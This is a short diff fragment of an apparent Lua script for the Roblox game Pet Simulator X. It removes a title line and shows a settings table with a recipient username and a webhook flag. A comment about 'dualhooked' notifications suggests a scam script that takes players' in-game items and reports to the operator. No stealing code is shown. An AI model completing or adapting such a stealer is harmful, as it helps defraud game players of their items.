@@ -6,8 +6,6 @@
   |_| \_\_/___/___|_| |_|\__,_|_.__/  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|
   
 ]]--
-_G.ScriptTitle = "Pet Simulator X Script: Loading Gui"
-
 getgenv().Settings = {
     User = "maybeimpro1220",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
